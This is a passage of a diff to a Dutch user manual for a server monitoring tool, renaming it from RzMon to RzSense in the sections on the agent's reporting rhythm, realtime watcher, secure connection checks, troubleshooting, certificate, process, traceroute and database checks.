 - de **diepere controle** van een service (poorten, protocoltest, fouten in het log, eigen test) en de **extra test** (URL of poort);
@@ -1922,19 +1924,19 @@ Hoe vaak er echt een **rapport** uitgaat, de **tik**, stel je in RzMon in. Is de
 
 Of een service draait, CPU, RAM, disks en poorten worden elke tik gemeten. Een service die stopt, zie je dus altijd bij de volgende tik.
 
-**Meteen beoordeeld:** de agent-checks van een server worden beoordeeld zodra het rapport binnen is, niet pas bij de volgende cron-minuut van RzMon. Met een tik van 30 s komt een melding dus hooguit ongeveer 30 s na het probleem (plus je eigen *pas melden na …*). Ping-, poort-, HTTP- en certificaatchecks doet RzMon zelf, elke minuut.
+**Meteen beoordeeld:** de agent-checks van een server worden beoordeeld zodra het rapport binnen is, niet pas bij de volgende cron-minuut van RzSense. Met een tik van 30 s komt een melding dus hooguit ongeveer 30 s na het probleem (plus je eigen *pas melden na …*). Ping-, poort-, HTTP- en certificaatchecks doet RzSense zelf, elke minuut.
 
 **Contact zien** (vanaf 1.99.0): in de agenttabel (*Instellingen → Agents*, kolom **Contact**), in de *Agent Manager* en op de serverkaart op het dashboard staat wanneer de agent zich het laatst meldde en wanneer het volgende contact verwacht wordt. De tijden lopen live mee (elke seconde, met elke 5 seconden de nieuwste stand).
 - **Laatste:** tijd en "… geleden". **Volgende:** tijd en "over 23 s"; "nu verwacht" als het moment net voorbij is.
 - 🟠 **… te laat:** het contact had er al moeten zijn (na een kwart ritme speling, minstens 15 s). 🔴 **offline sinds …:** na de offline-tijd (*Agent offline na … minuten*, minstens 3 tikken).
 - ⚡ **Realtime aan:** "of eerder bij een gebeurtenis": bij een login, sudo of een service die stopt meldt de agent zich meteen.
-- **Echte ritme:** RzMon onthoudt de laatste 20 contacten en toont het ritme dat de agent werkelijk aanhoudt (de middelste tussenpoos, dus extra realtime-meldingen tellen nauwelijks mee). Komt hij duidelijk minder vaak dan ingesteld, dan staat er ⚠️ *werkelijk elke 1 min (ingesteld 30 s)*: meestal draait hij via cron (minimaal elke minuut) in plaats van de systemd-timer, of duurt een ronde langer dan het ritme. Het volgende contact wordt dan met het echte ritme berekend.
+- **Echte ritme:** RzSense onthoudt de laatste 20 contacten en toont het ritme dat de agent werkelijk aanhoudt (de middelste tussenpoos, dus extra realtime-meldingen tellen nauwelijks mee). Komt hij duidelijk minder vaak dan ingesteld, dan staat er ⚠️ *werkelijk elke 1 min (ingesteld 30 s)*: meestal draait hij via cron (minimaal elke minuut) in plaats van de systemd-timer, of duurt een ronde langer dan het ritme. Het volgende contact wordt dan met het echte ritme berekend.
 - **Sorteren:** klik op de kolomkop **Contact ⇅** om de agents die het langst niets lieten horen bovenaan te zetten; nog een keer klikken sorteert weer op naam. Je browser onthoudt de keuze.
 
 > **Bestaande installaties:** de timer van 30 s komt mee met de agent-update (⬆ Bijwerken). Tot die tijd rapporteert de agent zoals zijn oude timer hem start (meestal elke 60 s).
 
 #### Realtime-watcher ⚡
-Normaal ziet RzMon een gebeurtenis bij de volgende tik. Met **realtime** weet RzMon het binnen een paar seconden:
+Normaal ziet RzSense een gebeurtenis bij de volgende tik. Met **realtime** weet RzSense het binnen een paar seconden:
 
 | Wat | Hoe de watcher het ziet |
 |---|---|
@@ -1943,7 +1945,7 @@ Normaal ziet RzMon een gebeurtenis bij de volgende tik. Met **realtime** weet Rz
 | Nieuw of gewijzigd bestand onder een **🔴-pad** van *Bestanden bewaken* (IDS) | inotify (`inotifywait`) |
 
 - **Aanzetten:** per server in de *Agent Manager* → **⚡ Realtime: aan**. Standaard staat het uit. De agent neemt het binnen een minuut over.
-- **Hoe het werkt:** de dienst `rzmon-watch` analyseert zelf niets. Hij let alleen op, en start bij een gebeurtenis meteen een gewone agent-run. Die verwerkt alles zoals altijd (logins, brute force, IDS, services, bestanden), en RzMon beoordeelt het rapport direct. Hooguit één extra run per 10 seconden, ook tijdens een brute-force-aanval.
+- **Hoe het werkt:** de dienst `rzmon-watch` analyseert zelf niets. Hij let alleen op, en start bij een gebeurtenis meteen een gewone agent-run. Die verwerkt alles zoals altijd (logins, brute force, IDS, services, bestanden), en RzSense beoordeelt het rapport direct. Hooguit één extra run per 10 seconden, ook tijdens een brute-force-aanval.
 - **Status:** in de *Agent Manager* staat *⚡ Realtime actief · systemlog ✔ · bestanden ✔*, en op de IDS-pagina *⚡ realtime* bij de server.
 - **Dienst:** `rzmon-watch` wordt bij het installeren of bijwerken van de agent aangemaakt (alleen met systemd). Hij draait altijd, maar doet niets zolang realtime uit staat. Stopt hij, dan start systemd hem opnieuw; en valt hij helemaal weg, dan doet de gewone timer alles nog, alleen trager. Bekijken: `systemctl status rzmon-watch`.
 - **inotify-tools** (voor bestanden) installeert de setup automatisch, bij elke installatie en elke update. Op Rocky, Alma, RHEL en Oracle Linux staat het in **EPEL**; de setup kijkt of EPEL er is en installeert het zo nodig eerst:
@@ -1952,7 +1954,7 @@ Normaal ziet RzMon een gebeurtenis bij de volgende tik. Met **realtime** weet Rz
   - Oracle Linux: `oracle-epel-release-el<versie>`.
 
   CRB (CodeReady Builder) wordt niet aangezet; dat is voor `inotify-tools` niet nodig. Lukt het niet, bijvoorbeeld zonder internet, dan gaat de installatie gewoon door. Wil je geen EPEL: `--no-epel` bij de setup, of `EPEL=0` in `/etc/default/rzmon-agent`.
-- **Melding in RzMon:** ontbreekt EPEL of `inotify-tools`, dan staat er in de *Agent Manager* een waarschuwing met de oplossing: **⬆ Opnieuw installeren** (de agent doet het dan zelf, als de server internet heeft), of het commando voor op de server. Op de IDS-pagina staat bij de server *EPEL ontbreekt*. Zonder inotify-tools werkt realtime voor logins en services gewoon; bestanden worden dan bij de gewone runs gecontroleerd.
+- **Melding in RzSense:** ontbreekt EPEL of `inotify-tools`, dan staat er in de *Agent Manager* een waarschuwing met de oplossing: **⬆ Opnieuw installeren** (de agent doet het dan zelf, als de server internet heeft), of het commando voor op de server. Op de IDS-pagina staat bij de server *EPEL ontbreekt*. Zonder inotify-tools werkt realtime voor logins en services gewoon; bestanden worden dan bij de gewone runs gecontroleerd.
 - **Op een server altijd uit:** `REALTIME=0` in `/etc/default/rzmon-agent`.
 - **Niet beschikbaar** via cron of op TrueNAS SCALE (daar kun je geen blijvende eigen dienst toevoegen).
 - **Home Assistant-add-on:** daar kijkt de add-on elke 5 seconden of er iets verandert aan de add-ons, Core of de boot-tijd van HA OS; zo ja, dan volgt meteen een rapport.
@@ -1963,62 +1965,62 @@ Normaal ziet RzMon een gebeurtenis bij de volgende tik. Met **realtime** weet Rz
 | Onderdeel | Wat je ziet |
 |---|---|
 | Agent | Versie en controlegetal (SHA-256) van het script; hoe hij gestart wordt (systemd-timer met de volgende start, cron, TrueNAS of de HA-add-on); de realtime-watcher; het instellingenbestand (rechten, en welke regels overbodig zijn); de reservekopieën |
-| Verbinding | Het adres en het reserve-adres; hoe het certificaat van RzMon gecontroleerd wordt (vastgezet, gewoon, of ⚠️ niet); of RzMon **nu** bereikbaar is, met de tijd voor DNS, verbinden en TLS; de TLS-versie en het versleutelingsalgoritme; het certificaat van RzMon (naam, geldig tot) en of de vingerafdruk klopt |
+| Verbinding | Het adres en het reserve-adres; hoe het certificaat van RzSense gecontroleerd wordt (vastgezet, gewoon, of ⚠️ niet); of RzSense **nu** bereikbaar is, met de tijd voor DNS, verbinden en TLS; de TLS-versie en het versleutelingsalgoritme; het certificaat van RzSense (naam, geldig tot) en of de vingerafdruk klopt |
 | Versleuteling | Eigen sleutel (kenmerk, sinds wanneer) of ⚠️ nog een token of de oude algemene sleutel; de methode (AES-256 + HMAC-SHA256, elk bericht uniek en 5 minuten geldig) |
-| Contact | Het laatste rapport: tijd, gelukt of de fout, duur, grootte, versleuteld, en via het gewone of het reserve-adres. Verder: wat RzMon ontving (disks, services, poorten …), wat er nog meeging (processen, certificaatbestanden, softwarelijst, heartbeats, IDS), het ritme en wanneer het volgende rapport komt, de laatste 10 contacten, de fouten van de laatste 24 uur, en wat RzMon laat bewaken |
-| Beveiligingscontrole | De uitkomst van de verbindingscontrole van RzMon (hieronder), van het laatste rapport |
+| Contact | Het laatste rapport: tijd, gelukt of de fout, duur, grootte, versleuteld, en via het gewone of het reserve-adres. Verder: wat RzSense ontving (disks, services, poorten …), wat er nog meeging (processen, certificaatbestanden, softwarelijst, heartbeats, IDS), het ritme en wanneer het volgende rapport komt, de laatste 10 contacten, de fouten van de laatste 24 uur, en wat RzSense laat bewaken |
+| Beveiligingscontrole | De uitkomst van de verbindingscontrole van RzSense (hieronder), van het laatste rapport |
 
-**In RzMon: de verbindingscontrole.** Per agent staat in de **Agent Manager** een lijst met ✅ of ⚠️. In de agenttabel (*Instellingen → Agents*) staat dezelfde uitkomst in de kolom 🔐. Een ⚠️ in die kolom opent de Agent Manager. De punten:
+**In RzSense: de verbindingscontrole.** Per agent staat in de **Agent Manager** een lijst met ✅ of ⚠️. In de agenttabel (*Instellingen → Agents*) staat dezelfde uitkomst in de kolom 🔐. Een ⚠️ in die kolom opent de Agent Manager. De punten:
 - eigen sleutel;
 - versleuteld;
 - via https (rechtstreeks met vastgezet certificaat, of via de proxy);
-- het certificaat van RzMon wordt gecontroleerd (geen `INSECURE=1` zonder vingerafdruk);
+- het certificaat van RzSense wordt gecontroleerd (geen `INSECURE=1` zonder vingerafdruk);
 - IP-slot;
 - de nieuwste versie;
 - de sleutel is op tijd vernieuwd;
-- geen oud token meer in RzMon;
+- geen oud token meer in RzSense;
 - instellingen op de server opgeruimd, met rechten 600;
-- **agent ongewijzigd**: het script op de server heeft dezelfde SHA-256 als de agent die RzMon levert, dus niemand heeft eraan gezeten;
+- **agent ongewijzigd**: het script op de server heeft dezelfde SHA-256 als de agent die RzSense levert, dus niemand heeft eraan gezeten;
 - een reservekopie.
 
 *Hoe staat het ervoor?* toont een samenvatting, met de knop **🧹 Alles opruimen**.
 
 **🧹 Opruimen**
-- **Per agent** (Agent Manager → 🧹 Opruimen): RzMon wist het oude token. De agent installeert zichzelf opnieuw bij zijn volgende rapport: eerst de reservekopie, daarna de nieuwste agent met opgeruimde instellingen.
-- **Alle agents** (*Instellingen → Agents → Standaardinstellingen → 🧹 Alle agents opruimen*, met je wachtwoord): dit doet hetzelfde voor elke agent. Hebben ze allemaal een eigen sleutel, dan wist RzMon ook de oude **algemene sleutel** en zet het **alleen agents met een eigen sleutel** aan.
-- **Op de server:** `sudo rzmon-agent-setup --cleanup` ruimt alleen de instellingen op, met een reservekopie. De vingerafdruk van het certificaat van RzMon (`PIN`) gaat daarbij uit de instellingen; de agent bewaart hem zelf (in `/var/lib/rzmon-agent`), en vanaf agent 1.66.1 gebruikt ook `rzmon-agent-setup --update` die.
+- **Per agent** (Agent Manager → 🧹 Opruimen): RzSense wist het oude token. De agent installeert zichzelf opnieuw bij zijn volgende rapport: eerst de reservekopie, daarna de nieuwste agent met opgeruimde instellingen.
+- **Alle agents** (*Instellingen → Agents → Standaardinstellingen → 🧹 Alle agents opruimen*, met je wachtwoord): dit doet hetzelfde voor elke agent. Hebben ze allemaal een eigen sleutel, dan wist RzSense ook de oude **algemene sleutel** en zet het **alleen agents met een eigen sleutel** aan.
+- **Op de server:** `sudo rzmon-agent-setup --cleanup` ruimt alleen de instellingen op, met een reservekopie. De vingerafdruk van het certificaat van RzSense (`PIN`) gaat daarbij uit de instellingen; de agent bewaart hem zelf (in `/var/lib/rzmon-agent`), en vanaf agent 1.66.1 gebruikt ook `rzmon-agent-setup --update` die.
 
-**Alleen agents met een eigen sleutel** (*Beveiligde verbinding*): een agent die zich meldt met alleen een token, wordt geweigerd. Koppelen met een koppelcode blijft altijd kunnen. Dit aanzetten kan alleen als alle agents een eigen sleutel hebben. Zodra een agent een eigen sleutel heeft, wist RzMon zijn token vanzelf.
+**Alleen agents met een eigen sleutel** (*Beveiligde verbinding*): een agent die zich meldt met alleen een token, wordt geweigerd. Koppelen met een koppelcode blijft altijd kunnen. Dit aanzetten kan alleen als alle agents een eigen sleutel hebben. Zodra een agent een eigen sleutel heeft, wist RzSense zijn token vanzelf.
 
 **Melding:** verbindt een agent niet meer veilig, dan krijg je een ⚠️ via je kanalen, en een ✅ als het weer goed is. Dat geldt voor: geen eigen sleutel, onversleuteld, het script gewijzigd, of het certificaat niet gecontroleerd. De kanalen kies je bij *Instellingen → ℹ️ Systeeminfo → Agent verbindt niet veilig*.
 
 **Via http?** Klik in de Agent Manager op **🌐 Naar https**. De agent test het nieuwe adres eerst en gaat pas over als het werkt. Daarna kun je *Agents alleen via https* aanzetten.
 
-#### 8.2.2 Services kiezen in RzMon
-Welke services de agent bewaakt, stel je in RzMon in, niet meer op de server:
+#### 8.2.2 Services kiezen in RzSense
+Welke services de agent bewaakt, stel je in RzSense in, niet meer op de server:
 
 1. Klap de server open → **＋ Check** → type **Service**.
 2. Onder *Servicenaam* staat een lijst van de services op die server (die aan staan bij het opstarten, of draaien), met hun status: 🟢 actief, 🔴 mislukt, ⚪ uit. Typ om te zoeken en klik om te kiezen. Services die al een check hebben, staan grijs.
 3. Opslaan. Binnen ongeveer 2 minuten bewaakt de agent de service, inclusief de diepere controle (8.7).
 
-Verwijder je de check, dan houdt de agent ermee op. De agent vraagt alleen de **status** op (`systemctl is-active` en `systemctl show`); RzMon kan op de server niets starten of stoppen.
+Verwijder je de check, dan houdt de agent ermee op. De agent vraagt alleen de **status** op (`systemctl is-active` en `systemctl show`); RzSense kan op de server niets starten of stoppen.
 
 Staat een service niet in de lijst (bijvoorbeeld omdat hij uit staat), typ dan zelf de naam. Een agent van vóór 1.20.0 stuurt nog geen lijst: werk hem bij met **⬆ Bijwerken** (8.2.1).
 
-> `SERVICES` in `/etc/default/rzmon-agent` is **verouderd**. Een bestaande lijst blijft werken: die services worden óók gemeld. Je kunt hem weghalen zodra je voor die services een check in RzMon hebt.
+> `SERVICES` in `/etc/default/rzmon-agent` is **verouderd**. Een bestaande lijst blijft werken: die services worden óók gemeld. Je kunt hem weghalen zodra je voor die services een check in RzSense hebt.
 
 ### 8.3 Goed om te weten
 - **Gegevens:** CPU, RAM, alle echte mounts, de gekozen services, de luisterende TCP-poorten, de vervaldatum van de gekozen certificaten en, als podman er staat, de containers (8.6).
-- **Netwerk:** de agent stuurt zelf naar RzMon. Op de bewaakte server hoeft dus geen poort open; die server moet RzMon wel kunnen bereiken op de *Basis-URL* uit Setup.
+- **Netwerk:** de agent stuurt zelf naar RzSense. Op de bewaakte server hoeft dus geen poort open; die server moet RzSense wel kunnen bereiken op de *Basis-URL* uit Setup.
 - **Root:** de agent draait als root om procesnamen bij poorten te zien. De systemd-service is afgeschermd (`ProtectSystem`, `NoNewPrivileges`); de agent leest alleen en schrijft niets.
 - **Token gelekt?** Klik op *Agent Manager* → **↻ Nieuw token** en voer op de server `sudo rzmon-agent-setup --token <nieuw token>` uit.
 - **Foutmeldingen** tijdens het installeren:
   - `403` → het token klopt niet, of de server staat niet op type *Remote met agent*;
-  - "kan niet downloaden" → het adres klopt niet, of RzMon is niet bereikbaar vanaf die server;
+  - "kan niet downloaden" → het adres klopt niet, of RzSense is niet bereikbaar vanaf die server;
   - certificaat → `--insecure`.
 
 ### 8.4 Komt er niets binnen? Verbindingstest 🩺
-**In RzMon:** klap de server open → **Agent Manager**. Bovenaan staat een live-status, die elke 5 seconden wordt bijgewerkt:
+**In RzSense:** klap de server open → **Agent Manager**. Bovenaan staat een live-status, die elke 5 seconden wordt bijgewerkt:
 - ✔ **Laatste rapport 12 s geleden vanaf 192.168.1.20**: de agent werkt.
 - ⏳ **Nog geen rapport ontvangen**: er komt niets binnen.
 - **Geweigerde pogingen**, met IP-adres en reden: bijvoorbeeld *onbekend token* of *server staat niet op type 'Remote met agent'*.
@@ -2033,16 +2035,16 @@ De test loopt stap voor stap na waar het misgaat, en stopt bij de eerste echte f
 |---|---|---|
 | Planning | Draait de systemd-timer, of draait cron? Hoe liep de laatste run? | `sudo systemctl enable --now rzmon-agent.timer`; cron installeren |
 | Instellingen | Zijn adres en token ingevuld? | Test met `sudo` draaien; opnieuw installeren |
-| Adres | Wijst het naar deze server zelf (`localhost`)? | Het IP van de RzMon-server gebruiken |
-| DNS | Kan de naam van RzMon worden opgezocht? | IP-adres gebruiken, of `/etc/hosts` |
-| Netwerk | Is de poort van RzMon bereikbaar? | Firewall op RzMon: `firewall-cmd --add-service=http`; VLAN/router |
-| RzMon | Draait daar echt RzMon? Of een doorverwijzing, of een 404? | Juiste URL (http/https, zonder `/public`) |
-| Token | Kent RzMon dit token, en staat de server op type *agent*? | Commando opnieuw kopiëren uit RzMon |
+| Adres | Wijst het naar deze server zelf (`localhost`)? | Het IP van de RzSense-server gebruiken |
+| DNS | Kan de naam van RzSense worden opgezocht? | IP-adres gebruiken, of `/etc/hosts` |
+| Netwerk | Is de poort van RzSense bereikbaar? | Firewall op RzSense: `firewall-cmd --add-service=http`; VLAN/router |
+| RzSense | Draait daar echt RzSense? Of een doorverwijzing, of een 404? | Juiste URL (http/https, zonder `/public`) |
+| Token | Kent RzSense dit token, en staat de server op type *agent*? | Commando opnieuw kopiëren uit RzSense |
 | Gegevens | CPU, disks, services en poorten verzamelen | Bv. `iproute` installeren voor poorten |
 | Rapport | Proefrapport versturen | — |
 
 Zonder het installatiescript kan het ook: `sudo /usr/local/bin/rzmon-agent.sh --test`.
-Met een oudere agent-versie: eerst bijwerken met de knop in RzMon (8.2.1) of `sudo rzmon-agent-setup --update`, of het installatiecommando opnieuw uitvoeren.
+Met een oudere agent-versie: eerst bijwerken met de knop in RzSense (8.2.1) of `sudo rzmon-agent-setup --update`, of het installatiecommando opnieuw uitvoeren.
 
 <details>
 <summary>Handmatig installeren (zonder het script)</summary>
@@ -2061,9 +2063,9 @@ sudo bash -c 'set -a; . /etc/default/rzmon-agent; /usr/local/bin/rzmon-agent.sh'
 ### 8.5 Certificaten bewaken 🔒
 Het verloop van certificaten kun je op twee manieren bewaken. Je kunt ze ook combineren.
 
-| | **Zonder agent** (RzMon meet zelf) | **Via de agent** |
+| | **Zonder agent** (RzSense meet zelf) | **Via de agent** |
 |---|---|---|
-| Wat | Elke TLS-poort die RzMon kan bereiken: servers in je netwerk én op internet | Certificaat**bestanden** op de server, en `host:poort` gezien **vanaf die server** (ook `localhost:443`) |
+| Wat | Elke TLS-poort die RzSense kan bereiken: servers in je netwerk én op internet | Certificaat**bestanden** op de server, en `host:poort` gezien **vanaf die server** (ook `localhost:443`) |
 | Handig voor | Websites, NAS, Proxmox, MQTT, mailservers… | Diensten die alleen lokaal luisteren of achter een firewall zitten, Let's Encrypt-certificaten (ook als de dienst plat ligt), en servers die alleen die server kan bereiken |
 | Instellen | Check *SSL-certificaat* met `host` of `host:poort` (of in de poortscan op **＋ Cert**) | Check *SSL-certificaat*: kies een bestand uit de lijst die de agent vond, of typ een pad of `localhost:poort` (agent 1.59.0+). Of `CERTS` op de server |
 
@@ -2072,10 +2074,10 @@ Het verloop van certificaten kun je op twee manieren bewaken. Je kunt ze ook com
 - **🔄 Opnieuw zoeken**: de agent zoekt bij zijn volgende rapporten meteen opnieuw (meestal binnen een paar minuten), handig na een nieuw certificaat.
 - **Extra mappen**: *Instellingen → Agents → Ook zoeken naar certificaten in* (voor alle agents), of `CERT_DIRS` in `/etc/default/rzmon-agent` (per server; vervangt de standaardmappen).
 - **Zelf invullen** kan altijd: een pad (`/data/certs/app.crt`) of `localhost:8443`.
-- **Certificaat lezen**: *Automatisch* leest een bestand en `localhost`/`127.0.0.1` via de agent, en de rest vanaf RzMon. Kies *Op de server zelf (agent)* om ook een andere naam vanaf die server te bekijken, of *Vanaf RzMon* om het via het netwerk te doen.
+- **Certificaat lezen**: *Automatisch* leest een bestand en `localhost`/`127.0.0.1` via de agent, en de rest vanaf RzSense. Kies *Op de server zelf (agent)* om ook een andere naam vanaf die server te bekijken, of *Vanaf RzSense* om het via het netwerk te doen.
 - **Hele keten**: staan er meerdere certificaten in een bestand (fullchain) of stuurt de dienst een keten mee, dan kijkt de agent naar alle certificaten. Verloopt een tussencertificaat eerder dan het certificaat zelf, dan telt die datum, met "let op: … in de keten verloopt eerder" in het bericht.
 - **Voorstellen**: bij *🔎 Wat wordt nog niet bewaakt* staan ook gevonden bestanden (behalve al lang verlopen) en TLS-poorten op de server (443, 8443, 9443, 993, 995, 465, 636, 853, 5986, 8883, 6443) als certificaatcheck via de agent.
-- Op de **RzMon-server zelf** (type *Lokaal*) leest RzMon een bestand rechtstreeks; de webserver moet het dan wel mogen lezen.
+- Op de **RzSense-server zelf** (type *Lokaal*) leest RzSense een bestand rechtstreeks; de webserver moet het dan wel mogen lezen.
 
 **Wat de agent meldt:** de regel `CERTS` in `/etc/default/rzmon-agent`, met spaties tussen de waarden:
 ```bash
@@ -2086,10 +2088,10 @@ CERTS="/etc/letsencrypt/live/*/cert.pem /etc/pki/tls/certs/mijn.crt localhost:84
 - **Standaard:** staat `CERTS` er niet in, dan meldt de agent alle Let's Encrypt-certificaten (`/etc/letsencrypt/live/*/cert.pem`). Met `CERTS=""` meldt hij er geen.
 - **Installatiescript:** stelt bij het installeren zelf voor wat het vindt: Let's Encrypt en lokale poorten zoals 443, 8443, 8006 of 9443.
 - **Wijzigen:** `sudo rzmon-agent-setup --certs "…"`, of het bestand aanpassen met `sudo nano /etc/default/rzmon-agent`.
-- **Hoe vaak:** elk uur. RzMon rekent zelf het aantal dagen uit, dus vaker is niet nodig.
+- **Hoe vaak:** elk uur. RzSense rekent zelf het aantal dagen uit, dus vaker is niet nodig.
 - **Benodigd:** `openssl`; het installatiescript installeert dat zo nodig.
 
-**In RzMon:** klik bij de server op **＋ Check** en kies *SSL-certificaat*. In het veld *Host[:poort] of bestand* verschijnt ook een lijst met de certificaten uit `CERTS`. Een check daarop krijgt "· via agent" in het bericht.
+**In RzSense:** klik bij de server op **＋ Check** en kies *SSL-certificaat*. In het veld *Host[:poort] of bestand* verschijnt ook een lijst met de certificaten uit `CERTS`. Een check daarop krijgt "· via agent" in het bericht.
 - *Certificaat controleren* aan: een certificaat dat de agent niet vertrouwt, zoals een self-signed certificaat, wordt CRITICAL.
 - Bij bestanden wordt alleen de vervaldatum bekeken.
 
@@ -2102,28 +2104,28 @@ Met de check **Proces** kijk je of een programma draait dat geen systemd-service
 - **Zoeken op naam**: de naam zoals `ps` of `top` hem toont (`nginx`, `mariadbd`, `python3`). Ook de bestandsnaam van het programma werkt.
 - **Zoeken op patroon**: een regex in de hele opdrachtregel, bv. `python3 .*main\.py` of `java .*-jar /opt/app/app.jar`. Handig als er meerdere `python3`-processen draaien.
 - **Alleen van gebruiker** (optioneel): bv. `www-data`.
-- **Keuzelijst**: op een agent-server (agent 1.59.0+) en op de RzMon-server zelf zie je onder het veld wat er draait, met aantal, gebruiker en opdrachtregel. Klik om te kiezen, of typ om te filteren.
+- **Keuzelijst**: op een agent-server (agent 1.59.0+) en op de RzSense-server zelf zie je onder het veld wat er draait, met aantal, gebruiker en opdrachtregel. Klik om te kiezen, of typ om te filteren.
 - **Uitkomst**: draait het niet: CRITICAL. Optioneel een **minimaal** of **maximaal aantal** (WARNING), en drempels voor **CPU** (%, 100% = één core) en **RAM** (MB, werkgeheugen) van alle gevonden processen samen.
 - **Herstart**: is het oudste proces later gestart dan bij de vorige controle, dan komt er een ℹ️ info-melding "Proces … is herstart" (info staat standaard uit, §6.2).
 - In het bericht: aantal, CPU, RAM en sinds wanneer het draait.
-- Niet op Home Assistant-agents en niet op servers zonder agent (dan kan RzMon de processen niet zien). Processen staan niet bij *🔎 Wat wordt nog niet bewaakt*: je kiest ze zelf.
+- Niet op Home Assistant-agents en niet op servers zonder agent (dan kan RzSense de processen niet zien). Processen staan niet bij *🔎 Wat wordt nog niet bewaakt*: je kiest ze zelf.
 
 
 ### 8.5b Pad-check: het pad naar een doel 🛣️ (vanaf 1.177.0, agent 1.78.0)
-Met **＋ Check → Pad (traceroute)** bij een server met de agent meet RzMon het pad van die server naar een doel, bijvoorbeeld `1.1.1.1` of je eigen website.
+Met **＋ Check → Pad (traceroute)** bij een server met de agent meet RzSense het pad van die server naar een doel, bijvoorbeeld `1.1.1.1` of je eigen website.
 
 | Wat | Hoe |
 |---|---|
 | **Elke hop** | vertraging (gemiddeld, beste, slechtste), jitter en verlies, met `mtr` (of `traceroute`) |
-| **Switches** | een gewone switch zie je niet in een traceroute. Vul bij *Tussenliggende apparaten* hun IP-adressen in: RzMon pingt ze en zet ze op de juiste plek in het pad |
+| **Switches** | een gewone switch zie je niet in een traceroute. Vul bij *Tussenliggende apparaten* hun IP-adressen in: RzSense pingt ze en zet ze op de juiste plek in het pad |
 | **UniFi** | met de UniFi-koppeling (lokaal account, *Instellingen → Koppelingen*): op welke switchpoort de server zit, de snelheid, en de uplink van die switch met fouten |
 | **Virtueel** | draait de server als VM, dan staat de host (bij *Afhankelijk van*, bv. Proxmox) als laag in het pad |
 | **Doorvoer** | iperf3: de echte snelheid in Mbit/s naar een andere server met de agent |
 
-**Doorvoer (iperf3).** iperf3 meet de echte snelheid tussen twee computers: de ene ontvangt, de andere stuurt 3 seconden zoveel mogelijk data. Een ping zegt alleen hoe snel een pakketje heen en terug gaat, de linksnelheid alleen wat de kabel zou kunnen. RzMon kiest zelf een server met de agent en iperf3 in hetzelfde netwerk (of de server die je kiest). Daar start de agent kort een ontvanger die na één meting stopt (hooguit 2 minuten); er blijft niets openstaan. Per server zet je dat uit met **Mag doorvoertest ontvangen** in het formulier van de server. Standaard elk uur; ook eens per dag of alleen met de knop **Doorvoer nu testen** in de popup.
+**Doorvoer (iperf3).** iperf3 meet de echte snelheid tussen twee computers: de ene ontvangt, de andere stuurt 3 seconden zoveel mogelijk data. Een ping zegt alleen hoe snel een pakketje heen en terug gaat, de linksnelheid alleen wat de kabel zou kunnen. RzSense kiest zelf een server met de agent en iperf3 in hetzelfde netwerk (of de server die je kiest). Daar start de agent kort een ontvanger die na één meting stopt (hooguit 2 minuten); er blijft niets openstaan. Per server zet je dat uit met **Mag doorvoertest ontvangen** in het formulier van de server. Standaard elk uur; ook eens per dag of alleen met de knop **Doorvoer nu testen** in de popup.
 Installeren: `sudo apt install mtr-tiny iperf3` (Debian/Ubuntu) of `sudo dnf install mtr iperf3` (Rocky/RHEL); `lldpd` is optioneel.
 
-**iperf3 vanzelf installeren** (vanaf 1.192.0): staat de doorvoertest aan en mist iperf3, dan installeert de agent het zelf: op de server die meet, op de ontvanger die je koos, of (als je niets koos en nog geen server iperf3 heeft) op de server die RzMon als ontvanger zou kiezen. Dat gaat via dezelfde weg als pakketten bijwerken (apt of dnf, als root, met voortgang en een ℹ️-melding *Geïnstalleerd: iperf3*). Het gebeurt niet bij Home Assistant, niet bij TrueNAS (daar nooit apt), niet als commando's als root uit staan voor die server, en niet als er al een update loopt; hooguit eens per 12 uur per server, ook na een mislukte poging. In de popup van de pad-check staat dan *iperf3 wordt geïnstalleerd op …*; de doorvoertest volgt vanzelf. Uitzetten kan met de instelling `iperf_install` = 0. Switches en routers kunnen geen iperf3: daarvoor zijn de ping en UniFi.
+**iperf3 vanzelf installeren** (vanaf 1.192.0): staat de doorvoertest aan en mist iperf3, dan installeert de agent het zelf: op de server die meet, op de ontvanger die je koos, of (als je niets koos en nog geen server iperf3 heeft) op de server die RzSense als ontvanger zou kiezen. Dat gaat via dezelfde weg als pakketten bijwerken (apt of dnf, als root, met voortgang en een ℹ️-melding *Geïnstalleerd: iperf3*). Het gebeurt niet bij Home Assistant, niet bij TrueNAS (daar nooit apt), niet als commando's als root uit staan voor die server, en niet als er al een update loopt; hooguit eens per 12 uur per server, ook na een mislukte poging. In de popup van de pad-check staat dan *iperf3 wordt geïnstalleerd op …*; de doorvoertest volgt vanzelf. Uitzetten kan met de instelling `iperf_install` = 0. Switches en routers kunnen geen iperf3: daarvoor zijn de ping en UniFi.
 
 **Wanneer meldt hij?** Te veel vertraging naar het doel (de drempels in ms) of verlies (warning/critical in %), een tussenliggend apparaat dat niet reageert (CRITICAL), een linksnelheid die zakt (bv. een poort van 1 Gbit naar 100 Mbit: vaak een slechte kabel) en doorvoer onder de grens (WARNING). Verlies bij een tussenhop van je provider telt niet, zolang de hops erna niets verliezen. Een gewijzigd pad staat bij *Wat er veranderde* en kan als ℹ️ info (*Instellingen → Meldingen → Info*).
 
@@ -2139,8 +2141,8 @@ De check **Database** bewaakt MariaDB/MySQL en PostgreSQL echt van binnen. Bij �
 - **Bewaken**: het **Overzicht** (alles in één check), of één waarde met eigen drempels, grafiek en melding (zie de tabel hieronder);
 - **Meten** (op een server met de agent):
   - **Via de agent (lokaal, aanbevolen)**: de agent leest de database op de server zelf uit. De database hoeft niet open op het netwerk. *Waar*: **Op de server zelf**, of **In een container** (kies de container; de agent gebruikt `docker exec` of `podman exec`, ook rootless);
-  - **RzMon maakt verbinding (netwerk)**: zoals vóór 1.200.0, met adres[:poort] (standaard 3306 of 5432). Voor PostgreSQL moet PHP op de RzMon-server `pdo_pgsql` hebben (`php-pgsql`).
-- **Gebruiker en wachtwoord**: via de agent is een gebruiker **niet nodig**. Zonder gebruiker leest de agent (als root) MariaDB/MySQL via de socket en PostgreSQL als gebruiker `postgres`, zonder wachtwoord. In een container gebruikt hij voor MariaDB/MySQL root met het wachtwoord uit de container zelf (`MARIADB_ROOT_PASSWORD`/`MYSQL_ROOT_PASSWORD`). Geef je wel een wachtwoord op, dan stuurt RzMon dat alleen naar een **versleutelde agent**; het gaat via de omgeving naar de client, nooit op de opdrachtregel. Via het netwerk is een gebruiker nodig, met alleen leesrechten:
+  - **RzSense maakt verbinding (netwerk)**: zoals vóór 1.200.0, met adres[:poort] (standaard 3306 of 5432). Voor PostgreSQL moet PHP op de RzSense-server `pdo_pgsql` hebben (`php-pgsql`).
